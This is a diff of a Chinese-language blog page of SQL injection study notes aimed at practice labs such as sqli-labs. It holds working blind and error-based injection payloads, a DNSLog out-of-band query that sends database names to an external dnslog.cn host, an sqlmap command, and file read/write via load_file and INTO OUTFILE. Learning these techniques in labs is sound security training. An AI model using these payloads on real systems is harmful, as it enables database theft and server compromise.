@@ -27,8 +27,12 @@
 <meta property="og:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011204700027.png">
 <meta property="og:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011205254395.png">
 <meta property="og:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011205657206.png">
+<meta property="og:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231012082218590.png">
+<meta property="og:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231012083952258.png">
+<meta property="og:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/52b8185c15804b098e5832e56952f9d5.png">
+<meta property="og:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/c22c368cda784e5ebb911ff0bbd0fa99.png">
 <meta property="article:published_time" content="2023-10-11T12:00:19.000Z">
-<meta property="article:modified_time" content="2023-10-11T13:57:20.470Z">
+<meta property="article:modified_time" content="2023-10-14T04:22:18.039Z">
 <meta property="article:author" content="pochen">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011203622770.png">
@@ -224,7 +228,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          15k 字
+          18k 字
         
       </span>
     
@@ -235,7 +239,7 @@
         
         
         
-          124 分钟
+          147 分钟
         
       </span>
     
@@ -277,7 +281,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="01-web网站基础框架"><a href="#01-web网站基础框架" class="headerlink" title="01:web网站基础框架"></a>01:web网站基础框架</h1><h4 id="项目架构："><a href="#项目架构：" class="headerlink" title="项目架构："></a>项目架构：</h4><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011203622770.png" srcset="/img/loading.gif" lazyload alt="image-20231011203622770"></p>
+                <h2 id="01-web网站基础框架"><a href="#01-web网站基础框架" class="headerlink" title="01:web网站基础框架"></a>01:web网站基础框架</h2><h4 id="项目架构："><a href="#项目架构：" class="headerlink" title="项目架构："></a>项目架构：</h4><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011203622770.png" srcset="/img/loading.gif" lazyload alt="image-20231011203622770"></p>
 <h4 id="SQL注入的发生"><a href="#SQL注入的发生" class="headerlink" title="SQL注入的发生"></a>SQL注入的发生</h4><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011204700027.png" srcset="/img/loading.gif" lazyload alt="image-20231011204700027" style="zoom:80%;" />
 
 <p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011205254395.png" srcset="/img/loading.gif" lazyload alt="image-20231011205254395"></p>
@@ -386,7 +390,6 @@
 <p>包裹多个括号……<br>b. 单引号字符串+括号的注入<br>使用括号和单引号包裹参数，比如下面这种SQL。</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = (<span class="hljs-string">&#x27;zhangsan&#x27;</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = ((<span class="hljs-string">&#x27;zhangsan&#x27;</span>));<br></code></pre></td></tr></table></figure>
 
-
 <p>包裹多个括号……<br>c. 双引号字符串+括号的注入<br>使用括号和双引号包裹参数，比如下面这种SQL</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = (<span class="hljs-string">&quot;zhangsan&quot;</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = ((<span class="hljs-string">&quot;zhangsan&quot;</span>));<br></code></pre></td></tr></table></figure>
 
@@ -471,24 +474,19 @@
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (length(database()))&gt;7 --+	<br>?id=1&#x27; and (length(database()))&gt;8 --+<br></code></pre></td></tr></table></figure>
 
 <p>数据库名</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) --+或?id=1&#x27; and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure>
-
-<p>或所有数据库名</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(schema_name)from information_schema.schemata),0x7e),1) --+<br></code></pre></td></tr></table></figure>
-
-<p>由于无法像联合查询一样一次性看到所有数据库名称，就需要使用limit参数逐个查询</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select schema_name from information_schema.schemata limit 0,1),floor (rand()*2)) as x from information_schema.tables group by x) as a) --+<br></code></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">1 and ascii(substr(database(),1,1))&gt;110<br>1 and ascii(substr(database(),2,1))&gt;110<br></code></pre></td></tr></table></figure>
 
 <p>指定数据库中表名</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat(((select concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)),floor (rand(0)*2))x from information_schema.tables group by x)a) --+<br></code></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs text">第一张表<br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 0,1),1,1))&gt;110<br>(不断改变范围，把第一张数据表的第一个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 0,1),2,1))&gt;110<br>(不断改变范围，把第一张数据表的第二个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 0,1),3,1))&gt;110<br>(不断改变范围，把第一张数据表的第三个字母猜解出来)<br><br>......<br>......<br>最后得到表名为news<br><br>第二张表<br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 1,1),1,1))&gt;110<br>(不断改变范围，把第二张数据表的第一个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 1,1),2,1))&gt;110<br>(不断改变范围，把第二张数据表的第二个字母猜解出来)<br><br>1 and ascii(substr((select table_name from information_schema.tables<br> where table_schema=database() limit 1,1),3,1))&gt;110<br>(不断改变范围，把第二张数据表的第三个字母猜解出来)<br><br>......<br>......<br>最后得到表名为flag<br><br></code></pre></td></tr></table></figure>
 
 <p>指定数据库中指定表中所有字段名</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and (select 1 from (select count(*),concat((select concat(column_name,&#x27;;&#x27;) from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),floor(rand()*2)) as x from information_schema.columns group by x) as a) --+<br></code></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">表的字段数<br>1 and (select count(column_name) from information_schema.columns<br> where table_name=&#x27;flag&#x27;)=1<br><br>得到flag只有一个字段<br><br>字段名称<br>1 and ascii(substr((select column_name from information_schema.columns<br> where table_name=&#x27;flag&#x27;),1,1))&gt;110<br>(不断改变范围，把字段名猜解出来)<br><br>......<br>得到字段名也为flag<br><br></code></pre></td></tr></table></figure>
 
 <p>具体数据</p>
-<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users where username not in (&#x27;Dumb&#x27;,&#x27;Angelina&#x27;))))--+<br></code></pre></td></tr></table></figure>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs text">1 and ascii(substr((select * from sqli.flag where id=1),1,1))&gt;110<br>1 and ascii(substr((select * from sqli.flag where id=1),2,1))&gt;110<br>1 and ascii(substr((select * from sqli.flag where id=1),3,1))&gt;110<br><br>......<br>这是一个巨大的工作量，所以应该积累到的一个经验是：<br>手工盲注特别繁琐，碰到这类题目要会用工具sqlmap<br><br></code></pre></td></tr></table></figure>
 
-<p>或使用limit挨个遍历<br>?id&#x3D;1’ and (select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x3a,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) –+</p>
+
+
 <h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><p>前提：页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。<br>缺点：因为是通过sleep()函数影响的响应时间来判断语句是否执行，所以比布尔盲注更慢，真实环境下时间盲注一个注入点需要跑大概五六个小时。<br>猜解数据库<br>数据库个数</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=1 and if((select count(schema_name) from information_schema.schemata)=9,sleep(5),1)<br></code></pre></td></tr></table></figure>
 
@@ -538,6 +536,63 @@
 
 <p>爆破数据<br>–current-db 当前使用的数据库<br>–dbs 列出数据库信息<br>-D 指定数据库，爆破指定数据库中的表<br>-D 数据库名 –tables<br>-T 指定数据表名，爆破指定表中的字段<br>-D 库名 -T 表名 –columns<br>-C 指定字段名，爆破具体数据<br>–dump 将数据导出、转储<br>指定库、表、字段，查询具体数据</p>
 <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">.\sqlmap.py -u &quot;http://192.168.xxx.xxx/sqli/Less-1/?id=1&quot; --dbms=MySQL --technique=T -v 3 -D security<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="DNSLog注入"><a href="#DNSLog注入" class="headerlink" title="DNSLog注入"></a>DNSLog注入</h2><p>流程图：</p>
+<img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231012082218590.png" srcset="/img/loading.gif" lazyload alt="image-20231012082218590" style="zoom:80%;" />
+
+<h4 id="CEYE平台"><a href="#CEYE平台" class="headerlink" title="CEYE平台"></a>CEYE平台</h4><p><a target="_blank" rel="noopener" href="http://ceye.io/profile">http://ceye.io/profile</a></p>
+<h4 id="UNC（Windows）"><a href="#UNC（Windows）" class="headerlink" title="UNC（Windows）"></a>UNC（Windows）</h4><p>Universal Naming Convention 通用命名规则</p>
+<img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231012083952258.png" srcset="/img/loading.gif" lazyload alt="image-20231012083952258" style="zoom:80%;" />
+
+<h4 id="DNSLog注入流程："><a href="#DNSLog注入流程：" class="headerlink" title="DNSLog注入流程："></a>DNSLog注入流程：</h4><p>1、把select LOAD_FILE()注入到数据库，访问文<br>件<br>2、UNC构建DNS服务器地址，假装访问文件，产生DNSLog</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">select load<span class="hljs-constructor">_file(&#x27;<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">aaa</span>.<span class="hljs-params">yourid</span>.<span class="hljs-params">dnslog</span>.<span class="hljs-params">cn</span><span class="hljs-operator">/</span><span class="hljs-params">wuya</span>&#x27;)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>3、把子域名替换成函数或者查询SQL</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">select if((<span class="hljs-name">select</span> load_file(<span class="hljs-name">concat</span>(&#x27;////&#x27;,database(),&#x27;.yourid.dnslog.cn/wuya&#x27;))),<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="DNSLog注入脚本"><a href="#DNSLog注入脚本" class="headerlink" title="DNSLog注入脚本"></a>DNSLog注入脚本</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">python <span class="hljs-number">2</span><br>dnslogSql.py -u http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/sqli-labs/</span>Less-<span class="hljs-number">9</span>/?id=<span class="hljs-number">1</span> -c<br>dnslogSql.py -u <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-9/?id=1&#x27; and (&#123;&#125;)--+&quot;</span> --dbs<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="SQL高权限注入"><a href="#SQL高权限注入" class="headerlink" title="SQL高权限注入"></a>SQL高权限注入</h2><p>MySQL 权限介绍</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> host=<span class="hljs-string">&#x27;localhost&#x27;</span>\G;<br><br>	mysql权限表的验证过程为：<br><br>	先从<span class="hljs-keyword">user</span>表中的Host,<span class="hljs-keyword">User</span>,<span class="hljs-keyword">Password</span>这<span class="hljs-number">3</span>个字段中判断连接的ip、用户名、密码是否存在，存在则通过验证。<br><br>	通过身份认证后，进行权限分配，<br>	按照<span class="hljs-keyword">user</span>，db，tables_priv，columns_priv的顺序进行验证。<br>	即先检查全局权限表<span class="hljs-keyword">user</span>，如果<span class="hljs-keyword">user</span>中对应的权限为Y，则此用户对所有数据库的权限都为Y，<br>	将不再检查db, tables_priv,columns_priv；如果为N，则到db表中检查此用户对应的具体数据库，<br>	并得到db中为Y的权限；如果db中为N，则检查tables_priv中此数据库对应的具体表，取得表中的权限Y，以此类推。<br> <br> <span class="hljs-number">2.1</span> 系统权限表<br>	<span class="hljs-keyword">User</span>表：存放用户账户信息以及全局级别（所有数据库）权限，决定了来自哪些主机的哪些用户可以访问数据库实例，如果有全局权限则意味着对所有数据库都有此权限 <br>	Db表：存放数据库级别的权限，决定了来自哪些主机的哪些用户可以访问此数据库 <br>	Tables_priv表：存放表级别的权限，决定了来自哪些主机的哪些用户可以访问数据库的这个表 <br>	Columns_priv表：存放列级别的权限，决定了来自哪些主机的哪些用户可以访问数据库表的这个字段 <br>	Procs_priv表：存放存储过程和函数级别的权限<br><br><br> <span class="hljs-number">2.</span> MySQL 权限级别分为： <br>	全局性的管理权限： 作用于整个MySQL实例级别 <br>	数据库级别的权限： 作用于某个指定的数据库上或者所有的数据库上 <br>	数据库对象级别的权限：作用于指定的数据库对象上（表、视图等）或者所有的数据库对象<br> <br> <span class="hljs-number">3.</span>查看mysql 有哪些用户：<br>	mysql&gt; <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span>;<br> <br> <span class="hljs-number">4.</span>查看用户对应权限<br> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">user</span>=<span class="hljs-string">&#x27;root&#x27;</span> <span class="hljs-keyword">and</span> host=<span class="hljs-string">&#x27;localhost&#x27;</span>\G;  #所有权限都是Y ，就是什么权限都有<br> <br> <span class="hljs-number">5.</span>创建 mysql 用户<br>	有两种方式创建MySQL授权用户<br><br>	执行<span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span>/<span class="hljs-keyword">grant</span>命令（推荐方式）<br>	<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;finley&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;some_pass&#x27;</span>;<br>	通过<span class="hljs-keyword">insert</span>语句直接操作MySQL系统权限表<br> <br> <span class="hljs-number">6.</span>只提供id查询权限<br> <span class="hljs-keyword">grant</span> <span class="hljs-keyword">select</span>(id) <span class="hljs-keyword">on</span> test.<span class="hljs-keyword">temp</span> <span class="hljs-keyword">to</span> test1@<span class="hljs-string">&#x27;localhost&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123456&#x27;</span>;<br> <br> <span class="hljs-number">7.</span>把普通用户变成管理员<br>	<span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">ALL</span> <span class="hljs-keyword">PRIVILEGES</span> <span class="hljs-keyword">ON</span> *.* <span class="hljs-keyword">TO</span> <span class="hljs-string">&#x27;test1&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> <span class="hljs-keyword">WITH</span> <span class="hljs-keyword">GRANT</span> <span class="hljs-keyword">OPTION</span>;<br><br> <span class="hljs-number">8.</span>删除用户<br>	<span class="hljs-keyword">drop</span> <span class="hljs-keyword">user</span> finley@<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="SQL注入文件读写"><a href="#SQL注入文件读写" class="headerlink" title="SQL注入文件读写"></a>SQL注入文件读写</h2><p>文件读写注入的条件</p>
+<p>高版本的MYSQL添加了一个新的特性secure_file_priv，该选项限制了mysql导出文件的权限</p>
+<p><strong>secure_file_priv选项</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">linux<br><span class="hljs-built_in">cat</span>  etc/conf<br><br>win<br>www/mysql / my.ini<br></code></pre></td></tr></table></figure>
+
+<p>show global variables like ‘%secure%’  查看mysql全局变量的配置</p>
+<p>1、读写文件需要 <code>secure_file_priv</code>权限</p>
+<p><strong><code>secure_file_priv=</code></strong></p>
+<p>代表对文件读写没有限制</p>
+<p><code>secure_file_priv=NULL</code></p>
+<p>代表不能进行文件读写</p>
+<p><code>secure_file_priv=d:/phpstudy/mysql/data</code></p>
+<p>代表只能对该路径下文件进行读写</p>
+<p>2、知道网站绝对路径</p>
+<p>Windows常见：</p>
+<p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/52b8185c15804b098e5832e56952f9d5.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>Linux常见：</p>
+<p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/c22c368cda784e5ebb911ff0bbd0fa99.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>路径获取常见方式：</p>
+<p>报错显示，遗留文件，漏洞报错，平台配置文件等</p>
+<h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h4><p>使用函数：<code>load_file()</code></p>
+<p>后面的路径可以是单引号，0x，char转换的字符。</p>
+<p>注意：路径中斜杠是&#x2F;不是\。</p>
+<p>一般可以与union中做为一个字段使用，查看config.php(即mysql的密码)，apache配置…</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">LOAD_FILE</span>(<span class="hljs-params"><span class="hljs-string">&#x27;E:\\in.txt&#x27;</span></span>)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>1、只能访问本机的文件</p>
+<p>2、文件需要有读取权限</p>
+<p>3、字节数小于max_allowed_packet</p>
+<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><p>使用函数：<code>Into Outfile</code>（能写入多行，按格式输出）和 <code>into Dumpfile</code>（只能写入一行且没有输出格式）</p>
+<p>outfile 后面不能接0x开头或者char转换以后的路径，只能是单引号路径</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> <span class="hljs-number">123</span> INTO OUTFILE <span class="hljs-symbol">&#x27;E</span>:\\<span class="hljs-keyword">out</span>.txt&#x27;;<br></code></pre></td></tr></table></figure>
 
 
                 
@@ -600,6 +655,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2023/10/13/%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0%E9%9D%B6%E5%9C%BA/" title="漏洞练习靶场">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">漏洞练习靶场</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
